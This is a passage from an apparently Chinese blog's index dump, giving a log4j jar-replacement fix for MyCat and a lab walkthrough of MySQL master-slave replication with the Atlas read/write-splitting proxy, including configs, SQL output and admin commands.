&#x5199;&#x64CD;&#x4F5C;&#x662F;&#x5728;Master 192.168.73.21&#x4E0A;&#x8FDB;&#x884C;&#x7684; &#x66FF;&#x6362;log4j&#x53C2;&#x8003;&#xFF1A;https://www.yuque.com/ccazhw/tuacvk/doq6pc log4j-2.15-jar&#x5305;&#xFF0C;&#x66FF;&#x6362;&#x5373;&#x53EF;&#xFF0C;&#x6700;&#x65B0;&#x7684;log4j&#x7684;jar&#x8BF7;&#x5230;&#x963F;&#x91CC;&#x4E91;maven&#x4ED3;&#x5E93;&#x4E0B;&#x8F7D; &#x66FF;&#x6362;log4j&#x4E3A;log4j-1.15,1.15&#x524D;&#x7684;&#x7248;&#x672C;&#x6709;&#x6F0F;&#x6D1E;1234567[root@ctos7mini mycat]&amp; ll ./lib/log4j*-rwxrwxrwx. 1 mycat mycat 489884 Sep 27 2019 ./lib/log4j-1.2.17.jar-rwxrwxrwx. 1 mycat mycat 36947 Sep 27 2019 ./lib/log4j-1.2-api-2.5.jar-rwxrwxrwx. 1 mycat mycat 146761 Sep 27 2019 ./lib/log4j-api-2.5.jar-rwxrwxrwx. 1 mycat mycat 1106090 Sep 27 2019 ./lib/log4j-core-2.5.jar-rwxrwxrwx. 1 mycat mycat 22935 Sep 27 2019 ./lib/log4j-slf4j-impl-2.5.jar[root@ctos7mini mycat]# &#x5220;&#x6389;log4j-1.2.17.jar&#xFF0C;&#x66FF;&#x6362;lib&#x6587;&#x4EF6;&#x5939;&#x4E0A;&#x8FF0;&#x7684;4&#x4E2A;&#x6587;&#x4EF6;,&#x66FF;&#x6362;&#x4E3A;&#x4E0B;&#x9762;4&#x4E2A;&#x6587;&#x4EF6; &#x5B83;&#x4EEC;&#x7684;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x662F;https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-1.2-apihttps://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-apihttps://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-corehttps://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j-impl &#x8FD9;&#x662F;&#x7F13;&#x5B58;&#x4E0B;&#x6765;&#x7684;&#x6253;&#x5305;&#x597D;&#x7684;,&#x4E0D;&#x4FDD;&#x8BC1;&#x6700;&#x65B0;http://dl.mycat.org.cn/1.6.7.6/20211221142218/log4j-2.17.zip MyCat&#x6545;&#x969C;&#x89E3;&#x51B3; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Atlas实现MySQL读写分离","date":"2022-06-07T04:45:45.000Z","path":"/posts/62ec7971/","text":"MySQL + Atlas &#x2014; &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218; &#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#x914D;&#x7F6E; &#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E; Atlas&#x914D;&#x7F6E; &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5; &#x5E8F;&#x7AE0;Atlas&#x662F;360&#x56E2;&#x961F;&#x5F04;&#x51FA;&#x6765;&#x7684;&#x4E00;&#x5957;&#x57FA;&#x4E8E;MySQL-Proxy&#x57FA;&#x7840;&#x4E4B;&#x4E0A;&#x7684;&#x4EE3;&#x7406;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;MySQL-Proxy&#x7684;&#x4E00;&#x4E9B;BUG&#xFF0C;&#x5E76;&#x4E14;&#x4F18;&#x5316;&#x4E86;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#x3002;&#x800C;&#x4E14;&#x5B89;&#x88C5;&#x65B9;&#x4FBF;&#x3002;&#x914D;&#x7F6E;&#x7684;&#x6CE8;&#x91CA;&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x90FD;&#x662F;&#x4E2D;&#x6587;&#x3002;&#x82F1;&#x6587;&#x4E0D;&#x597D;&#x7684;&#x540C;&#x5B66;&#x6709;&#x798F;&#x4E86;&#x3002;Atlas&#x5B98;&#x65B9;&#x94FE;&#x63A5;&#xFF1A; https://github.com/Qihoo360/Atlas/blob/master/README_ZH.mdAtlas&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#xFF1A; https://github.com/Qihoo360/Atlas/releases &#x73AF;&#x5883;&#xFF1A; &#x7CFB;&#x7EDF; IP &#x89D2;&#x8272; CentOS7.4 192.168.73.20 Atlas&#x4EE3;&#x7406;&#x670D;&#x52A1; RHEL 7.3 192.168.73.21 MySQL_Master RHEL 7.3 192.168.73.22 MySQL_Slave &#x6CE8;&#x610F;&#xFF1A;&#x4E09;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x8981;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#xFF01; MySQL Master1234567891011121314151617181920212223[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidbind-address = 0.0.0.0user=mysqlinnodb_flush_log_at_trx_commit=1sync_binlog=1log-bin=mysql-binserver-id=1binlog-do-db=testdbbinlog-ignore-db=mysqlskip-name-resolvegeneral_log=ONgeneral_log_file= /var/lib/mysql/rhel_sqlsrv.log 12345678910111213141516171819202122232425262728CREATE DATABASE testdb DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;mysql&gt; grant replication slave on *.* to root@&apos;%&apos; identified by &apos;ccc.456&apos;;Query OK, 0 rows affected, 1 warning (0.01 sec)mysql&gt; select user,host from mysql.user;+---------------+--------------+| user | host |+---------------+--------------+| root | % || slave | 192.168.73.% || mysql.session | localhost || mysql.sys | localhost || root | localhost |+---------------+--------------+5 rows in set (0.00 sec)mysql&gt;mysql&gt; show master status;+------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+------------------+----------+--------------+------------------+-------------------+| mysql-bin.000003 | 1605 | testdb | mysql | |+------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt; 1234567[root@rhel7 ~]&amp; mysqldump -uroot -p -B testdb &gt; testdb.sqlEnter password:[root@rhel7 ~]&amp; lsanaconda-ks.cfg ha.sql mysql_master_ha rpm_mysql5.7 testdb.sql[root@rhel7 ~]&amp; scp testdb.sql root@192.168.73.22:~testdb.sql 100% 2126 2.1KB/s 00:00[root@rhel7 ~]&amp; MySQL Slave123456789101112131415161718[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidbind-address = 0.0.0.0log-bin=mysql-slave2server-id=3binlog-ignore-db=mysqllog_slave_updates=1skip-name-resolvegeneral_log=ONgeneral_log_file=/var/lib/mysql/rhel_sqlsrv.log 12345678910111213141516171819202122232425262728293031323334mysql&gt; change master to master_host=&apos;192.168.73.21&apos;, master_user=&apos;root&apos;,master_password=&apos;ccc.456&apos;,master_port=3306,master_log_file=&apos;mysql-bin.000003&apos;,master_log_pos=1605,master_connect_retry=10;Query OK, 0 rows affected, 2 warnings (0.00 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.73.21 Master_User: root Master_Port: 3306 Connect_Retry: 10 Master_Log_File: mysql-bin.000003 Read_Master_Log_Pos: 1605 Relay_Log_File: rhel_sqlsrv-relay-bin.000002 Relay_Log_Pos: 320 Relay_Master_Log_File: mysql-bin.000003 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB:.........................................&#x7701;&#x7565;................................................................... Master_Server_Id: 1 Master_UUID: 8f5a42da-cd2d-11ec-8c02-000c29f9275c Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind:.........................................&#x7701;&#x7565;...................................................................1 row in set (0.00 sec)mysql&gt; 123[root@rhel_sqlsrv ~]&amp; mysql -uroot -p &lt; testdb.sqlEnter password:[root@rhel_sqlsrv ~]&amp; &#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;Master12345Database changedmysql&gt; insert into book values(&apos;abc&apos;,123,456);Query OK, 1 row affected (0.00 sec)mysql&gt; Slave123456789101112131415mysql&gt; select * from book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 || Linux | 66 | 666 || Unix | 77 | 777 || abc | 123 | 456 |+-------------------------+-------+-------+7 rows in set (0.00 sec)mysql&gt; Atlas&#x914D;&#x7F6E;&#x5B89;&#x88C5;Atlas12345[root@ctos7mini ~]&amp; rpm -ivh Atlas-2.2.1.el6.x86_64.rpmPreparing... ################################# [100%]Updating / installing... 1:Atlas-2.2.1-1 ################################# [100%][root@ctos7mini ~]&amp; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677[root@ctos7mini ~]&amp; ll /usr/local/mysql-proxy/ -R/usr/local/mysql-proxy/:total 4drwxr-xr-x. 2 root root 75 May 7 04:33 bindrwxr-xr-x. 2 root root 22 May 7 04:33 confdrwxr-xr-x. 3 root root 4096 May 7 04:33 libdrwxr-xr-x. 2 root root 6 Dec 17 2014 log/usr/local/mysql-proxy/bin:total 44-rwxr-xr-x. 1 root root 9696 Dec 17 2014 encrypt-rwxr-xr-x. 1 root root 23564 Dec 17 2014 mysql-proxy-rwxr-xr-x. 1 root root 1552 Dec 17 2014 mysql-proxyd-rw-r--r--. 1 root root 6 Dec 17 2014 VERSION/usr/local/mysql-proxy/conf:total 4-rw-r--r--. 1 root root 2810 Dec 17 2014 test.cnf/usr/local/mysql-proxy/lib:total 9812-rwxr-xr-x. 1 root root 968655 Dec 17 2014 libevent-2.0.so.5-rwxr-xr-x. 1 root root 3464668 Dec 17 2014 libglib-2.0.so.0-rwxr-xr-x. 1 root root 35483 Dec 17 2014 libgmodule-2.0.so.0-rwxr-xr-x. 1 root root 8656 Dec 17 2014 libgthread-2.0.so.0-rwxr-xr-x. 1 root root 5021619 Dec 17 2014 libjemalloc.so.1-rwxr-xr-x. 1 root root 172984 Dec 17 2014 liblua-5.1.so-rwxr-xr-x. 1 root root 14735 Dec 17 2014 libmysql-chassis-glibext.so.0-rwxr-xr-x. 1 root root 73823 Dec 17 2014 libmysql-chassis.so.0-rwxr-xr-x. 1 root root 14446 Dec 17 2014 libmysql-chassis-timing.so.0-rwxr-xr-x. 1 root root 180107 Dec 17 2014 libmysql-proxy.so.0-rwxr-xr-x. 1 root root 71566 Dec 17 2014 libsql-tokenizer.so.0drwxr-xr-x. 4 root root 32 May 7 04:33 mysql-proxy/usr/local/mysql-proxy/lib/mysql-proxy:total 0drwxr-xr-x. 3 root root 162 May 7 04:33 luadrwxr-xr-x. 2 root root 44 May 7 04:33 plugins/usr/local/mysql-proxy/lib/mysql-proxy/lua:total 240-rw-r--r--. 1 root root 9387 Dec 17 2014 admin.lua-rwxr-xr-x. 1 root root 15966 Dec 17 2014 chassis.so-rwxr-xr-x. 1 root root 8988 Dec 17 2014 crc32.so-rwxr-xr-x. 1 root root 9416 Dec 17 2014 glib2.so-rwxr-xr-x. 1 root root 18323 Dec 17 2014 lfs.so-rwxr-xr-x. 1 root root 43879 Dec 17 2014 lpeg.so-rwxr-xr-x. 1 root root 102944 Dec 17 2014 mysql.so-rwxr-xr-x. 1 root root 9248 Dec 17 2014 posix.sodrwxr-xr-x. 2 root root 243 May 7 04:33 proxy-rwxr-xr-x. 1 root root 6626 Dec 17 2014 time.so/usr/local/mysql-proxy/lib/mysql-proxy/lua/proxy:total 80-rw-r--r--. 1 root root 536 Dec 17 2014 auth.lua-rw-r--r--. 1 root root 6670 Dec 17 2014 auto-config.lua-rw-r--r--. 1 root root 2807 Dec 17 2014 balance.lua-rw-r--r--. 1 root root 2873 Dec 17 2014 charset.lua-rw-r--r--. 1 root root 3477 Dec 17 2014 commands.lua-rw-r--r--. 1 root root 238 Dec 17 2014 crc32.lua-rw-r--r--. 1 root root 1906 Dec 17 2014 filter.lua-rw-r--r--. 1 root root 2706 Dec 17 2014 log.lua-rw-r--r--. 1 root root 6105 Dec 17 2014 parser.lua-rw-r--r--. 1 root root 14816 Dec 17 2014 split.lua-rw-r--r--. 1 root root 6366 Dec 17 2014 test.lua-rw-r--r--. 1 root root 106 Dec 17 2014 ticker.lua-rw-r--r--. 1 root root 6215 Dec 17 2014 tokenizer.lua#&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#xFF0C;&#x5206;&#x4E3A;message&#x3001;warning&#x3001;critical&#x3001;error&#x3001;debug&#x4E94;&#x4E2A;&#x7EA7;&#x522B;/usr/local/mysql-proxy/lib/mysql-proxy/plugins:total 4920-rwxr-xr-x. 1 root root 21134 Dec 17 2014 libadmin.so-rwxr-xr-x. 1 root root 5011799 Dec 17 2014 libproxy.so/usr/local/mysql-proxy/log:total 0 bin&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x90FD;&#x662F;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6; &#x201C;encrypt&#x201D;&#x662F;&#x7528;&#x6765;&#x5BF9;MySQL&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x7684;&#xFF0C;&#x5728;&#x914D;&#x7F6E;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x7528;&#x5230; &#x201C;mysql-proxy&#x201D;&#x662F;MySQL&#x81EA;&#x5DF1;&#x7684;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x4EE3;&#x7406; &#x201C;mysql-proxyd&#x201D;&#x662F;360&#x5F04;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x540E;&#x9762;&#x6709;&#x4E2A;&#x201C;d&#x201D;&#xFF0C;&#x670D;&#x52A1;&#x7684;&#x542F;&#x52A8;&#x3001;&#x91CD;&#x542F;&#x3001;&#x505C;&#x6B62;&#xFF0C;&#x90FD;&#x662F;&#x7528;&#x4ED6;&#x6765;&#x6267;&#x884C;&#x7684; conf&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x914D;&#x7F6E;&#x6587;&#x4EF6; &#x201C;test.cnf&#x201D;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x7528;&#x6765;&#x914D;&#x7F6E;&#x4EE3;&#x7406;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;vim&#x6765;&#x7F16;&#x8F91; lib&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x4E00;&#x4E9B;&#x5305;&#xFF0C;&#x4EE5;&#x53CA;Atlas&#x7684;&#x4F9D;&#x8D56; log&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x65E5;&#x5FD7;&#xFF0C;&#x5982;&#x62A5;&#x9519;&#x7B49;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x7684;&#x8BB0;&#x5F55; &#x8FDB;&#x5165;bin&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;encrypt&#x6765;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#xFF0C;&#x6211;&#x7684;MySQL&#x6570;&#x636E;&#x7684;&#x7528;&#x6237;&#x540D;&#x662F;root&#xFF0C;&#x5BC6;&#x7801;&#x662F;123456&#xFF0C;&#x6211;&#x9700;&#x8981;&#x5BF9;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;123[root@ctos7mini ~]&amp; cd /usr/local/mysql-proxy/[root@ctos7mini mysql-proxy]&amp; ./bin/encrypt 123456/iZxz+0GRoA= &#x914D;&#x7F6E;Atlas&#xFF0C;&#x4F7F;&#x7528;vim&#x8FDB;&#x884C;&#x7F16;&#x8F91;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[root@ctos7mini ~]&amp; cat /usr/local/mysql-proxy/conf/test.cnf[mysql-proxy]#&#x5E26;#&#x53F7;&#x7684;&#x4E3A;&#x975E;&#x5FC5;&#x9700;&#x7684;&#x914D;&#x7F6E;&#x9879;&#x76EE;#&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x7684;&#x7528;&#x6237;&#x540D;admin-username = root#&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x7684;&#x5BC6;&#x7801;admin-password = pwd#Atlas&#x540E;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;MySQL&#x4E3B;&#x5E93;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;proxy-backend-addresses = 192.168.73.21:3306#Atlas&#x540E;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;MySQL&#x4ECE;&#x5E93;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#xFF0C;@&#x540E;&#x9762;&#x7684;&#x6570;&#x5B57;&#x4EE3;&#x8868;&#x6743;&#x91CD;&#xFF0C;&#x7528;&#x6765;&#x4F5C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x82E5;&#x7701;&#x7565;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;1&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;proxy-read-only-backend-addresses = 192.168.73.22:3306@1#&#x7528;&#x6237;&#x540D;&#x4E0E;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x52A0;&#x5BC6;&#x8FC7;&#x7684;MySQL&#x5BC6;&#x7801;&#xFF0C;&#x5BC6;&#x7801;&#x4F7F;&#x7528;PREFIX/bin&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x52A0;&#x5BC6;&#x7A0B;&#x5E8F;encrypt&#x52A0;&#x5BC6;&#xFF0C;&#x4E0B;&#x884C;&#x7684;user1&#x548C;user2&#x4E3A;&#x793A;&#x4F8B;&#xFF0C;&#x5C06;&#x5176;&#x66FF;&#x6362;&#x4E3A;&#x4F60;&#x7684;MySQL&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x52A0;&#x5BC6;&#x5BC6;&#x7801;&#xFF01;pwds = root:/iZxz+0GRoA=#&#x8BBE;&#x7F6E;Atlas&#x7684;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;true&#x65F6;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;false&#x65F6;&#x4E3A;&#x524D;&#x53F0;&#x65B9;&#x5F0F;&#xFF0C;&#x4E00;&#x822C;&#x5F00;&#x53D1;&#x8C03;&#x8BD5;&#x65F6;&#x8BBE;&#x4E3A;false&#xFF0C;&#x7EBF;&#x4E0A;&#x8FD0;&#x884C;&#x65F6;&#x8BBE;&#x4E3A;true,true&#x540E;&#x9762;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C;&#x3002;daemon = true#&#x8BBE;&#x7F6E;Atlas&#x7684;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;true&#x65F6;Atlas&#x4F1A;&#x542F;&#x52A8;&#x4E24;&#x4E2A;&#x8FDB;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;&#x4E3A;monitor&#xFF0C;&#x4E00;&#x4E2A;&#x4E3A;worker&#xFF0C;monitor&#x5728;worker&#x610F;&#x5916;&#x9000;&#x51FA;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x5176;&#x91CD;&#x542F;&#xFF0C;&#x8BBE;&#x4E3A;false&#x65F6;&#x53EA;&#x6709;worker&#xFF0C;&#x6CA1;&#x6709;monitor&#xFF0C;&#x4E00;&#x822C;&#x5F00;&#x53D1;&#x8C03;&#x8BD5;&#x65F6;&#x8BBE;&#x4E3A;false&#xFF0C;&#x7EBF;&#x4E0A;&#x8FD0;&#x884C;&#x65F6;&#x8BBE;&#x4E3A;true,true&#x540E;&#x9762;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C;&#x3002;keepalive = true#&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5BF9;Atlas&#x7684;&#x6027;&#x80FD;&#x6709;&#x5F88;&#x5927;&#x5F71;&#x54CD;&#xFF0C;&#x53EF;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x9002;&#x5F53;&#x8BBE;&#x7F6E;event-threads = 8#&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#xFF0C;&#x5206;&#x4E3A;message&#x3001;warning&#x3001;critical&#x3001;error&#x3001;debug&#x4E94;&#x4E2A;&#x7EA7;&#x522B;log-level = message#&#x65E5;&#x5FD7;&#x5B58;&#x653E;&#x7684;&#x8DEF;&#x5F84;log-path = /usr/local/mysql-proxy/log#SQL&#x65E5;&#x5FD7;&#x7684;&#x5F00;&#x5173;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x4E3A;OFF&#x3001;ON&#x3001;REALTIME&#xFF0C;OFF&#x4EE3;&#x8868;&#x4E0D;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#xFF0C;ON&#x4EE3;&#x8868;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#xFF0C;REALTIME &#x4EE3;&#x8868;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#x4E14;&#x5B9E;&#x65F6;&#x5199;&#x5165;&#x78C1;&#x76D8;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;OFF#sql-log = OFF#&#x6162;&#x65E5;&#x5FD7;&#x8F93;&#x51FA;&#x8BBE;&#x7F6E;&#x3002;&#x5F53;&#x8BBE;&#x7F6E;&#x4E86;&#x8BE5;&#x53C2;&#x6570;&#x65F6;&#xFF0C;&#x5219;&#x65E5;&#x5FD7;&#x53EA;&#x8F93;&#x51FA;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8D85;&#x8FC7;sql-log-slow&#xFF08;&#x5355;&#x4F4D;&#xFF1A;ms)&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55; &#x3002;&#x4E0D;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#x5219;&#x8F93;&#x51FA;&#x5168;&#x90E8;&#x65E5;&#x5FD7;&#x3002;#sql-log-slow = 10#&#x5B9E;&#x4F8B;&#x540D;&#x79F0;&#xFF0C;&#x7528;&#x4E8E;&#x540C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x591A;&#x4E2A;Atlas&#x5B9E;&#x4F8B;&#x95F4;&#x7684;&#x533A;&#x5206;#instance = test#Atlas&#x76D1;&#x542C;&#x7684;&#x5DE5;&#x4F5C;&#x63A5;&#x53E3;IP&#x548C;&#x7AEF;&#x53E3;proxy-address = 0.0.0.0:1234#Atlas&#x76D1;&#x542C;&#x7684;&#x7BA1;&#x7406;&#x63A5;&#x53E3;IP&#x548C;&#x7AEF;&#x53E3;admin-address = 0.0.0.0:2345#&#x5206;&#x8868;&#x8BBE;&#x7F6E;&#xFF0C;&#x6B64;&#x4F8B;&#x4E2D;person&#x4E3A;&#x5E93;&#x540D;&#xFF0C;mt&#x4E3A;&#x8868;&#x540D;&#xFF0C;id&#x4E3A;&#x5206;&#x8868;&#x5B57;&#x6BB5;&#xFF0C;3&#x4E3A;&#x5B50;&#x8868;&#x6570;&#x91CF;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#xFF0C; &#x82E5;&#x4E0D;&#x5206;&#x8868;&#x5219;&#x4E0D;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;#tables = person.mt.id.3#&#x9ED8;&#x8BA4;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;&#x540E;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x6267;&#x884C;SET NAMES&#x8BED;&#x53E5;#charset = utf8#&#x5141;&#x8BB8;&#x8FDE;&#x63A5;Atlas&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x7CBE;&#x786E;IP&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;IP&#x6BB5;&#xFF0C;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#xFF0C;&#x82E5;&#x4E0D;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;&#x5219;&#x5141;&#x8BB8;&#x6240;&#x6709;IP &#x8FDE;&#x63A5;&#xFF0C;&#x5426;&#x5219;&#x53EA;&#x5141;&#x8BB8;&#x5217;&#x8868;&#x4E2D;&#x7684;IP&#x8FDE;&#x63A5;#client-ips = 127.0.0.1, 192.168.1#Atlas&#x524D;&#x9762;&#x6302;&#x63A5;&#x7684;LVS&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x7684;IP(&#x6CE8;&#x610F;&#x4E0D;&#x662F;&#x865A;IP)&#xFF0C;&#x82E5;&#x6709;LVS&#x4E14;&#x8BBE;&#x7F6E;&#x4E86;client-ips&#x5219;&#x6B64;&#x9879;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#xFF0C;&#x5426; &#x5219;&#x53EF;&#x4EE5;&#x4E0D;&#x8BBE;&#x7F6E;#lvs-ips = 192.168.1.1[root@ctos7mini ~]&amp; &#x542F;&#x52A8;Atlas 123456789[root@ctos7mini bin]&amp; cd /usr/local/mysql-proxy/bin/[root@ctos7mini bin]&amp; ./mysql-proxyd test statusMySQL-Proxy of test is NOT running[root@ctos7mini bin]&amp; ./mysql-proxyd test startOK: MySQL-Proxy of test is started[root@ctos7mini bin]&amp; ./mysql-proxyd test statusMySQL-Proxy of test is running (13844)MySQL-Proxy of test is running (13846)[root@ctos7mini bin]&amp; systemctl stop mysqld 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P2345 -uroot -ppwdmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 1Server version: 5.0.99-agent-adminCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;ERROR 1105 (07000): use &apos;SELECT * FROM help&apos; to see the supported commandsmysql&gt; show databases;ERROR 1105 (07000): use &apos;SELECT * FROM help&apos; to see the supported commandsmysql&gt; helpFor information about MySQL products and services, visit: http://www.mysql.com/For developer information, including the MySQL Reference Manual, visit: http://dev.mysql.com/To buy MySQL Enterprise support, training, or other products, visit: https://shop.mysql.com/List of all MySQL commands:Note that all text commands must be first on line and end with &apos;;&apos;? (\\?) Synonym for `help&apos;.clear (\\c) Clear the current input statement.connect (\\r) Reconnect to the server. Optional arguments are db and host.delimiter (\\d) Set statement delimiter.edit (\\e) Edit command with $EDITOR.ego (\\G) Send command to mysql server, display result vertically.exit (\\q) Exit mysql. Same as quit.go (\\g) Send command to mysql server.help (\\h) Display this help.nopager (\\n) Disable pager, print to stdout.notee (\\t) Don&apos;t write into outfile.pager (\\P) Set PAGER [to_pager]. Print the query results via PAGER.print (\\p) Print current command.prompt (\\R) Change your mysql prompt.quit (\\q) Quit mysql.rehash (\\#) Rebuild completion hash.source (\\.) Execute an SQL script file. Takes a file name as an argument.status (\\s) Get status information from the server.system (\\!) Execute a system shell command.tee (\\T) Set outfile [to_outfile]. Append everything into given outfile.use (\\u) Use another database. Takes database name as argument.charset (\\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.warnings (\\W) Show warnings after every statement.nowarning (\\w) Don&apos;t show warnings after every statement.resetconnection(\\x) Clean session context.For server side help, type &apos;help contents&apos;mysql&gt; select * from help;+----------------------------+---------------------------------------------------------+| command | description |+----------------------------+---------------------------------------------------------+| SELECT * FROM help | shows this help || SELECT * FROM backends | lists the backends and their state || SET OFFLINE $backend_id | offline backend server, $backend_id is backend_ndx&apos;s id || SET ONLINE $backend_id | online backend server, ... || ADD MASTER $backend | example: &quot;add master 127.0.0.1:3306&quot;, ... || ADD SLAVE $backend | example: &quot;add slave 127.0.0.1:3306&quot;, ... || REMOVE BACKEND $backend_id | example: &quot;remove backend 1&quot;, ... || SELECT * FROM clients | lists the clients || ADD CLIENT $client | example: &quot;add client 192.168.1.2&quot;, ... || REMOVE CLIENT $client | example: &quot;remove client 192.168.1.2&quot;, ... || 